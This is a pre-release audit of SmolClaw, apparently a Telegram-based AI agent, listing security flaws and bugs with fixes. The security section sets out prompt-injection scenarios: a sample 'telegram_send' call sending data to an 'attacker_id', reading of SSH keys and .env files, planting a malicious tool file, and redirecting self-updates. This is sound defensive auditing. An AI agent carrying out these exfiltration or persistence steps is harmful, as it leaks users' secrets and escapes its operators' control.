# SmolClaw Pre-Release Audit

Generated: 2026-03-01

---

## CRITICAL — Security

### S1. `telegram_send` / `telegram_send_file` accept arbitrary chat_id — data exfiltration
**Files:** `tools_sdk.py:15-18,62-65` | `tools.py:24-40`

The `chat_id` parameter is passed from LLM-controlled arguments with no validation against `ALLOWED_USER_IDS`. A prompt injection (via web search result, uploaded file, etc.) can instruct the agent to call `telegram_send(chat_id="attacker_id", message=<sensitive data>)`. The `telegram_send_file` variant compounds this — it accepts an arbitrary `file_path` with no path restriction, enabling exfiltration of any host file (`/etc/passwd`, `~/.ssh/id_rsa`, the `.env` containing tokens).

**Fix:** Validate `chat_id` against `ALLOWED_USER_IDS` in both tools. For `telegram_send_file`, additionally validate that the resolved path is within `workspace.HOME`.

---

### S2. Dynamic tool loader executes arbitrary Python — persistent RCE vector
**File:** `tool_loader.py:49-53`

Any `.py` file in `~/.smolclaw/tools/` is `exec_module`'d on every request. The agent has `Write` tool access with `cwd=~/.smolclaw/`, so a prompt injection can write a malicious `.py` file to `tools/`, which executes on the next Telegram message. No integrity check, signature, or human approval gate.

**Fix:** Add a file-hash allowlist that must be manually updated by the user, or require Telegram confirmation before loading a new tool file for the first time.

---

### S3. `SMOLCLAW_SOURCE` env var controls update URL — supply-chain pivot
**File:** `tools_sdk.py:44-47`

The agent can write to `.env` via `Bash`/`Write`, set `SMOLCLAW_SOURCE` to a malicious package URL, then call `self_update`. The update mechanism passes this URL directly to `uv tool install --upgrade`.

**Fix:** Hard-code the source URL or validate it starts with the expected GitHub prefix.

---

## CRITICAL — Bugs

### B1. `asyncio.get_event_loop()` deprecated / broken in Python 3.12+
**File:** `main.py:404,497,517`

Called outside a running event loop at lines 497 and 517 (`set_my_commands`, startup notification). Raises `DeprecationWarning` in 3.10+ and `RuntimeError` in future Python versions. At line 404, called inside an `async def` where `get_running_loop()` is correct.

**Fix:** Replace with `asyncio.run()` for sync contexts, `asyncio.get_running_loop()` for async contexts.

---

### B2. Signal handlers registered after `run_polling()` — never fire
**File:** `main.py:522-534`

The `_shutdown` function (which calls `scheduler.shutdown()` and saves handover) is registered as a signal handler, but `run_polling()` overwrites SIGTERM/SIGINT handlers. The scheduler is never cleanly shut down on normal termination.

**Fix:** Use `python-telegram-bot`'s `Application.post_shutdown` hook, or register handlers before `run_polling()`.

---

### B3. `datetime.now()` labeled as UTC in every agent prompt
**File:** `agent.py:299`

`datetime.now()` returns local time but the string says "UTC". The agent operates with a wrong understanding of the current time on any non-UTC server. The same module already uses `datetime.now(timezone.utc)` elsewhere.

**Fix:** `datetime.now(timezone.utc).strftime(...)`.

---

## IMPORTANT — Security

### S4. `.env` writer does not quote values — injection risk
**File:** `setup.py:44-48`

Values containing `#`, spaces, `=`, or newlines produce a malformed `.env` file. A `#` in a value is silently truncated by dotenv's comment stripping. A newline injects arbitrary env vars.

**Fix:** Quote values with double quotes, or use `python-dotenv`'s `set_key()`.

---

### S5. Raw exception messages leaked to Telegram users
**File:** `main.py:430,454,473`

`f"Error: {e}"` is sent to users. Exception messages can expose file system paths, API endpoints, or credential fragments from HTTP error responses.

**Fix:** Send a generic error message; log the full exception server-side.

---

### S6. Session JSONL logs stored with default permissions
**File:** `agent.py:98-109`

All messages (including any secrets the user types) are logged in plaintext JSONL. Directory permissions depend on umask (possibly world-readable on some Linux configs). No rotation or size cap.

**Fix:** Create sessions directory with mode `0o700`. Consider content truncation.

---

## IMPORTANT — Bugs

### B4. `_send_telegram` silently fails on messages > 4096 chars
**File:** `tools.py:10-21`

Telegram's `sendMessage` has a hard 4096-character limit. Used in `spawn_task` result delivery, cron job delivery, and `TelegramSender`. Long replies return `400 Bad Request` silently — the user sees nothing.

**Fix:** Add message chunking in `_send_telegram`.

---

### B5. Race condition on concurrent messages — duplicate client creation
**File:** `agent.py:284-296`

Between `await client.connect()` and `_sessions[chat_id] = _Session(...)`, the event loop can yield to another coroutine handling a second message from the same user. Both create clients, one leaks permanently.

**Fix:** Add a per-chat-id `asyncio.Lock`.

---

### B6. `handover_clear()` called inside `_system_prompt()` — data loss on connect failure
**File:** `agent.py:176-183`

If `client.connect()` fails after `_system_prompt()` is built, the handover file is already deleted but no session was established. The handover content is permanently lost.

**Fix:** Defer `handover_clear()` until after successful client connect.

---

### B7. `DEFAULT_CHAT` in scheduler evaluated at module import time
**File:** `scheduler.py:17`

`os.getenv("ALLOWED_USER_IDS")` is evaluated once at import. If the module is imported before `load_dotenv()`, or if the var changes at runtime, `DEFAULT_CHAT` is permanently `""` and all cron deliveries silently fail.

**Fix:** Convert to a function that reads the env var on each call.

---

### B8. `doc.file_name` can be `None` — `Path(None)` raises TypeError
**File:** `main.py:443`

Telegram's `file_name` field is optional. Stickers-as-files, voice messages forwarded as documents, etc. return `None`.

**Fix:** `raw_name = doc.file_name or f"{doc.file_unique_id}.bin"`.

---

### B9. No validation of required fields in `crons.yaml`
**File:** `scheduler.py:43-60`

Missing `id`, `cron`, or `prompt` in a job entry raises an unhandled `KeyError` that crashes the entire bot startup.

**Fix:** Validate required fields, log and skip invalid entries.

---

### B10. `_to_telegram_md` bold regex uses `re.DOTALL` — corrupts multi-paragraph bold
**File:** `main.py:30`

The regex with `re.DOTALL` can produce bold spans containing newlines. Telegram Markdown v1 rejects these, causing fallback to plain text for the entire message.

**Fix:** Remove `re.DOTALL`.

---

### B11. `session_log` raises uncaught `FileNotFoundError` if sessions/ dir is missing
**File:** `agent.py:98-109`

If the directory is deleted while the bot runs, or in cron contexts where `workspace.init()` wasn't called, `session_log` raises an exception that propagates and kills the current request.

**Fix:** `path.parent.mkdir(parents=True, exist_ok=True)` or wrap in try/except.

---

### B12. `/restart` bypasses graceful shutdown — scheduler and tasks abandoned
**File:** `main.py:371-378`

`os.execv` replaces the process image immediately. APScheduler threads are not stopped, file handles not flushed, background tasks abandoned. The handover-saving signal handler is never invoked.

**Fix:** Call `scheduler.shutdown(wait=False)` and save handover before `os.execv`.

---

### B13. `spawn_task` background tasks silently cancelled in cron context
**File:** `scheduler.py:26`

Cron jobs use `asyncio.run()` which creates a fresh event loop. When it completes, any `_background_tasks` created by `spawn_task` are cancelled. The task appears to succeed ("Task started") but never completes.

**Fix:** Document the limitation, or drain `_background_tasks` before returning.

---

## MINOR — Code Quality

### Q1. `__version__` mismatch: `__init__.py` says `0.1.0`, `pyproject.toml` says `0.2.0`
**Files:** `__init__.py:1` | `pyproject.toml:3`

**Fix:** Use `importlib.metadata.version("smolclaw")` in `__init__.py`, or keep them in sync.

---

### Q2. `session_log` type annotation says `str` but called with `dict`
**File:** `agent.py:98,323`

**Fix:** Change annotation to `str | dict`, or serialize the dict before passing.

---

### Q3. `SESSIONS_DIR` fixed at import time — disconnected from `workspace.HOME`
**File:** `agent.py:71`

**Fix:** Compute path lazily inside `session_log`.

---

## Fix Priority Order

1. **S1** — telegram_send/telegram_send_file chat_id + file_path validation (highest impact security)
2. **S2** — Dynamic tool loader integrity check
3. **S3** — Hard-code or validate SMOLCLAW_SOURCE
4. **B1** — asyncio.get_event_loop() deprecation
5. **B3** — datetime.now() UTC fix
6. **S4** — .env quoting
7. **B4** — Telegram 4096-char message chunking
8. **B2** — Signal handler registration
9. **B6** — Handover clear timing
10. **B7** — DEFAULT_CHAT lazy evaluation
11. **B8** — doc.file_name None guard
12. **B9** — crons.yaml validation
13. **B5** — Per-chat-id session lock
14. **B10** — re.DOTALL removal
15. **B11** — session_log directory guard
16. **B12** — /restart graceful shutdown
17. **B13** — spawn_task cron limitation
18. **S5** — Generic error messages
19. **S6** — Session log permissions
20. **Q1-Q3** — Code quality fixes
